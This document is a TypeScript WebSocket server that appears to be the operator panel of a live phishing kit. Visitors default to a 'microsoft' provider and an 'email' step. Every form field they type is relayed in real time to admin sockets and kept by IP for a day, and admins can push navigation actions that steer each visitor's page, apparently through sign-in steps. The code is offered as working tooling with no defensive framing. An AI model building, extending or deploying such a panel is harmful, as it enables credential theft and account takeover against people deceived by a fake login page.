import type { IncomingMessage } from 'http';
import type { Server } from 'http';
import { WebSocketServer, WebSocket } from 'ws';
import { logger } from './lib/logger.js';

interface Location {
  city: string;
  country: string;
  countryCode: string;
  flag: string;
}

interface Visitor {
  id: string;
  ws: WebSocket;
  ip: string;
  location: Location;
  provider: string;
  step: string;
  userAgent: string;
  connectedAt: number;
  formData: Record<string, string>;
}

interface VisitorPublic {
  id: string;
  ip: string;
  location: Location;
  provider: string;
  step: string;
  userAgent: string;
  connectedAt: number;
  formData: Record<string, string>;
}

interface PersistedSession {
  formData: Record<string, string>;
  provider: string;
  location: Location;
  userAgent: string;
  lastSeen: number;
}

const visitors = new Map<string, Visitor>();
const admins = new Set<WebSocket>();
const views = new Map<string, Set<WebSocket>>();
const persistedByIP = new Map<string, PersistedSession>();

const SESSION_TTL_MS = 24 * 60 * 60 * 1000;

function getClientIP(req: IncomingMessage): string {
  const fwd = req.headers['x-forwarded-for'];
  if (fwd) {
    const raw = Array.isArray(fwd) ? fwd[0] : fwd;
    return raw.split(',')[0]?.trim() ?? '0.0.0.0';
  }
  return req.socket.remoteAddress ?? '0.0.0.0';
}

async function fetchLocation(ip: string): Promise<Location> {
  const clean = ip.replace(/^::ffff:/, '');
  const isLocal =
    clean === '127.0.0.1' || clean === '::1' ||
    clean.startsWith('10.') || clean.startsWith('192.168.') ||
    /^172\.(1[6-9]|2\d|3[01])\./.test(clean);
  if (isLocal) return { city: 'Local Network', country: 'Local', countryCode: 'XX', flag: '🖥️' };
  try {
    const res = await fetch(`http://ip-api.com/json/${clean}?fields=status,city,country,countryCode`);
    const data = await (res.json() as Promise<{ status: string; city: string; country: string; countryCode: string }>);
    if (data.status === 'success') {
      const flag = data.countryCode.toUpperCase().split('').map(c => String.fromCodePoint(c.charCodeAt(0) + 127397)).join('');
      return { city: data.city, country: data.country, countryCode: data.countryCode, flag };
    }
  } catch (err) {
    logger.warn({ err }, 'geolocation fetch failed');
  }
  return { city: 'Unknown', country: 'Unknown', countryCode: '', flag: '🌐' };
}

function broadcastToAdmins(data: object) {
  const msg = JSON.stringify(data);
  for (const ws of admins) {
    if (ws.readyState === WebSocket.OPEN) ws.send(msg);
  }
}

function relayToViews(visitorId: string, data: object) {
  const viewSet = views.get(visitorId);
  if (!viewSet) return;
  const msg = JSON.stringify(data);
  for (const ws of viewSet) {
    if (ws.readyState === WebSocket.OPEN) ws.send(msg);
  }
}

function toPublic(v: Visitor): VisitorPublic {
  return { id: v.id, ip: v.ip, location: v.location, provider: v.provider, step: v.step, userAgent: v.userAgent, connectedAt: v.connectedAt, formData: { ...v.formData } };
}

function persistVisitor(v: Visitor) {
  persistedByIP.set(v.ip, {
    formData: { ...v.formData },
    provider: v.provider,
    location: v.location,
    userAgent: v.userAgent,
    lastSeen: Date.now(),
  });
}

function getPersistedSession(ip: string): PersistedSession | null {
  const s = persistedByIP.get(ip);
  if (!s) return null;
  if (Date.now() - s.lastSeen > SESSION_TTL_MS) { persistedByIP.delete(ip); return null; }
  return s;
}

export function setupWebSocket(server: Server) {
  const wss = new WebSocketServer({ server, path: '/api/ws' });

  wss.on('connection', (ws: WebSocket, req: IncomingMessage) => {
    const ip = getClientIP(req);

    ws.once('message', (raw) => {
      let msg: Record<string, unknown>;
      try { msg = JSON.parse(raw.toString()) as Record<string, unknown>; }
      catch { ws.close(); return; }

      // ── Admin ─────────────────────────────────────────────────────────────
      if (msg['type'] === 'register-admin') {
        admins.add(ws);
        ws.send(JSON.stringify({ type: 'visitors', visitors: Array.from(visitors.values()).map(toPublic) }));

        ws.on('message', (raw2) => {
          try {
            const m = JSON.parse(raw2.toString()) as Record<string, unknown>;

            if (m['type'] === 'push-action') {
              const vid = m['visitorId'] as string;
              const visitor = visitors.get(vid);
              if (visitor?.ws.readyState === WebSocket.OPEN) {
                visitor.ws.send(JSON.stringify({ type: 'action', action: m['action'] }));
              }
              relayToViews(vid, { type: 'action', action: m['action'] });
              logger.info({ visitorId: vid, action: m['action'] }, 'Admin pushed action');

            } else if (m['type'] === 'delete-form-data') {
              const vid = m['visitorId'] as string;
              const field = m['field'] as string | undefined;
              const visitor = visitors.get(vid);
              if (visitor) {
                if (!field || field === '*') {
                  visitor.formData = {};
                  const persisted = persistedByIP.get(visitor.ip);
                  if (persisted) persisted.formData = {};
                  broadcastToAdmins({ type: 'visitor-form-data-deleted', id: vid, field: '*' });
                } else {
                  delete visitor.formData[field];
                  const persisted = persistedByIP.get(visitor.ip);
                  if (persisted) delete persisted.formData[field];
                  broadcastToAdmins({ type: 'visitor-form-data-deleted', id: vid, field });
                }
              } else {
                // visitor already disconnected; wipe from persisted only
                const persisted = persistedByIP.get(ip);
                if (persisted) {
                  if (!field || field === '*') persisted.formData = {};
                  else delete persisted.formData[field];
                }
              }
            }
          } catch (err) { logger.warn({ err }, 'Admin message parse error'); }
        });

        ws.on('close', () => admins.delete(ws));
        logger.info('Admin connected');

      // ── View-only (modal iframe) ───────────────────────────────────────────
      } else if (msg['type'] === 'register-view') {
        const targetId = msg['targetId'] as string;
        if (!views.has(targetId)) views.set(targetId, new Set());
        views.get(targetId)!.add(ws);

        const visitor = visitors.get(targetId);
        if (visitor) {
          ws.send(JSON.stringify({ type: 'action', action: { navigate: visitor.step } }));
        }

        ws.on('close', () => {
          const viewSet = views.get(targetId);
          if (viewSet) { viewSet.delete(ws); if (viewSet.size === 0) views.delete(targetId); }
        });

      // ── Visitor ───────────────────────────────────────────────────────────
      } else if (msg['type'] === 'register-visitor') {
        const id = msg['id'] as string;
        const persisted = getPersistedSession(ip);

        fetchLocation(ip).then((location) => {
          const visitor: Visitor = {
            id, ws, ip, location,
            provider: (msg['provider'] as string) || 'microsoft',
            step: (msg['step'] as string) || 'email',
            userAgent: (msg['userAgent'] as string) || '',
            connectedAt: Date.now(),
            formData: persisted ? { ...persisted.formData } : {},
          };
          visitors.set(id, visitor);
          broadcastToAdmins({ type: 'visitor-joined', visitor: toPublic(visitor) });
          logger.info({ id, ip, location, restoredFields: Object.keys(visitor.formData).length }, 'Visitor connected');
        }).catch((err) => logger.warn({ err }, 'Failed to register visitor'));

        ws.on('message', (raw2) => {
          try {
            const m = JSON.parse(raw2.toString()) as Record<string, unknown>;

            if (m['type'] === 'step-update') {
              const v = visitors.get(id);
              if (v) {
                v.step = (m['step'] as string) ?? v.step;
                if (m['provider']) v.provider = m['provider'] as string;
                broadcastToAdmins({ type: 'visitor-updated', id, step: v.step, provider: v.provider });
                relayToViews(id, { type: 'action', action: { navigate: v.step } });
              }
            } else if (m['type'] === 'form-data') {
              const v = visitors.get(id);
              if (v) {
                const field = m['field'] as string;
                const value = m['value'] as string;
                v.formData[field] = value;
                broadcastToAdmins({ type: 'visitor-form-data', id, field, value });
                persistVisitor(v);
              }
            }
          } catch (err) { logger.warn({ err }, 'Visitor message parse error'); }
        });

        ws.on('close', () => {
          const v = visitors.get(id);
          if (v) persistVisitor(v);
          visitors.delete(id);
          broadcastToAdmins({ type: 'visitor-left', id });
          logger.info({ id }, 'Visitor disconnected');
        });

      } else { ws.close(); }
    });
  });

  logger.info('WebSocket server ready at /api/ws');
}
